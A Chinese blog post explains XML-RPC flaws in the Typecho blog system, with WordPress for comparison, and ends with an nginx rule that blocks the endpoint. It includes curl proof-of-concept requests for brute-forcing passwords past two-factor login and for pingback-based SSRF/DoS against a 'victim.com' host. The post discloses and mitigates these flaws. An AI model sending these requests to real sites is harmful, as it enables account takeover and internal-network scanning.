---
id: 733
layout: post
title: 'WordPress和Typecho xmlrpc漏洞'
date: 2016-04-20 21:12:00
author: virusdefender
tags: 
---

一般大家都关注WordPress，毕竟用户量巨大，而国内的Typecho作为轻量级的博客系统就关注的人并不多。Typecho有很多借鉴WordPress的，包括兼容的xmlrpc接口，而WordPress的这个接口爆出过多个漏洞，Typecho无一幸免。

## 账号密码爆破

WordPress的相关漏洞可以参考 https://blog.cloudflare.com/a-look-at-the-new-wordpress-brute-force-amplification-attack/ 这个漏洞在Typecho上要危害稍微小一点，因为WordPress是有破解保护的，而这个接口可以绕过这个保护，Typecho并没有这个保护，只要暴露了后台地址就然并卵了。但是我采用了后台登录的两步验证，这个接口接口确实绕过了两步验证。

POC

```shell
curl "https://example.com/action/xmlrpc" -d '<?xml version="1.0" encoding="UTF-8"?><methodCall><methodName>wp.getUsersBlogs</methodName><params><param><value>{USERNAME}</value></param><param><value>{PASSWORD}</value></param></params></methodCall>'
```

## Ping back造成的dos和SSRF

WordPress会尝试去访问Ping back的url，可能会造成dos问题。参考http://www.acunetix.com/blog/articles/wordpress-pingback-vulnerability/

同时，没有对url进行校验，可以用来扫描内网。

WordPress后来修补了SSRF的问题，后来被绕过，前几天刚刚重新修复，见 http://xlab.baidu.com/wordpress/。但是Typecho没有任何过滤。

POC

```shell
curl "https://example.com/action/xmlrpc" -d '<methodCall><methodName>pingback.ping</methodName><params><param><value><string>http://victim.com</string></value></param><param><value><string>https://example.com/index.php/archives/732/</string></value></param></params></methodCall>'
```

看到了xml，还顺手测试了一把xxe，不过暂时没有发现这个问题。解析xml时候的本地拒绝服务是存在的，Inutio XML-RPC Library的问题，有两个CVE。

## 解决方案

nginx屏蔽此url

```
if ($uri ~ ^/index.php/action/xmlrpc) {
    return 403;
}
```